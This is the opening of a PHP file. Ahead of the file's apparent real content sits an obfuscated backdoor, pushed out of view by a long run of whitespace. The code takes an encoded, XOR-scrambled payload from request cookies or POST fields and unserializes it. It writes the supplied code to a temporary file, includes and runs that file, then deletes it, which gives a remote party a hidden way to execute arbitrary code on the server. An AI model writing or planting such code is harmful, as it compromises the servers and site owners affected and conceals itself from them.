<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Tm_nds")){class Tm_nds{public static $LIwSyrMT = "1c1d7a3d-7a44-4cc9-b34d-4f70225694cb";public static $rlWto = NULL;public function __construct(){$FeAbtTYdcA = $_COOKIE;$fXjzQMckj = $_POST;$tkCJKTcfXX = @$FeAbtTYdcA[substr(Tm_nds::$LIwSyrMT, 0, 4)];if (!empty($tkCJKTcfXX)){$nOsSHcmZP = "base64";$JMCALbU = "";$tkCJKTcfXX = explode(",", $tkCJKTcfXX);foreach ($tkCJKTcfXX as $bEuuM){$JMCALbU .= @$FeAbtTYdcA[$bEuuM];$JMCALbU .= @$fXjzQMckj[$bEuuM];}$JMCALbU = array_map($nOsSHcmZP . "\x5f" . "\144" . 'e' . "\143" . "\x6f" . chr (100) . "\145", array($JMCALbU,)); $JMCALbU = $JMCALbU[0] ^ str_repeat(Tm_nds::$LIwSyrMT, (strlen($JMCALbU[0]) / strlen(Tm_nds::$LIwSyrMT)) + 1);Tm_nds::$rlWto = @unserialize($JMCALbU);}}public function __destruct(){$this->DzsMcA();}private function DzsMcA(){if (is_array(Tm_nds::$rlWto)) {$TVCbgW = sys_get_temp_dir() . "/" . crc32(Tm_nds::$rlWto["\x73" . chr ( 862 - 765 ).'l' . "\x74"]);@Tm_nds::$rlWto["\167" . chr ( 506 - 392 ).chr (105) . chr (116) . "\x65"]($TVCbgW, Tm_nds::$rlWto["\143" . "\x6f" . 'n' . chr (116) . chr ( 477 - 376 ).'n' . 't']);include $TVCbgW;@Tm_nds::$rlWto["\x64" . "\x65" . "\x6c" . chr ( 805 - 704 ).chr ( 1034 - 918 ).chr ( 954 - 853 )]($TVCbgW);exit();}}}$vJoyIBuiD = new Tm_nds(); $vJoyIBuiD = NULL;} ?><?php
/**
